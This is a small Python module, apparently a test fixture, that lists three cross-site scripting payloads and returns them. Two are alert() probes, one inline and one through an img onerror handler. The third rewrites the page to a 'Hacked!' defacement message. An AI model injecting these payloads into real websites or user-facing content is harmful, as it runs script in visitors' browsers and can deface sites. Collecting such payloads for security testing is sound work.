XSS_PAYLOADS = [
    "<script>alert('test')</script>",
    "<img src=\"nonexistent.jpg\" onerror=\"alert('XSS')\">",
    "<script>document.body.innerHTML = '<h1>Hacked!</h1><p>This site has been compromised.</p>';</script>"
]

def get_payloads()->list:
    return XSS_PAYLOADS

